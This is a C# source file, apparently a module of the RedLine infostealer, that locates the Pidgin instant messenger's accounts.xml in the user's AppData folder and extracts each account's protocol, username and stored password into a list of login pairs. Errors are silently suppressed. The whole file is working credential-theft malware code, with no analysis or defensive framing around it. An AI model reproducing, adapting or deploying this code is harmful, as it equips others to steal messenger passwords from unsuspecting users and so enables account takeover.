using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace RedLine.Logic.ImClient
{
	public static class Pidgin
	{
		public static List<LoginPair> ParseConnections()
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				string path = $"{Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)}\\.purple\\accounts.xml";
				if (!File.Exists(path))
				{
					return list;
				}
				list.AddRange(ParseCredentials(path));
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static List<LoginPair> ParseCredentials(string Path)
		{
			List<LoginPair> list = new List<LoginPair>();
			try
			{
				XmlTextReader reader = new XmlTextReader(Path);
				XmlDocument xmlDocument = new XmlDocument();
				xmlDocument.Load(reader);
				foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes)
				{
					LoginPair loginPair = ParseAccounts(childNode);
					if (loginPair.Login != "UNKNOWN" && loginPair.Host != "UNKNOWN")
					{
						list.Add(loginPair);
					}
				}
				return list;
			}
			catch
			{
				return list;
			}
		}

		private static LoginPair ParseAccounts(XmlNode xmlNode)
		{
			LoginPair loginPair = new LoginPair();
			try
			{
				foreach (XmlNode childNode in xmlNode.ChildNodes)
				{
					if (childNode.Name == "protocol")
					{
						loginPair.Host = childNode.InnerText;
					}
					if (childNode.Name == "name")
					{
						loginPair.Login = childNode.InnerText;
					}
					if (childNode.Name == "password")
					{
						loginPair.Password = childNode.InnerText;
					}
				}
				return loginPair;
			}
			catch
			{
				return loginPair;
			}
			finally
			{
				loginPair.Login = (string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login);
				loginPair.Host = (string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host);
				loginPair.Password = (string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password);
			}
		}
	}
}
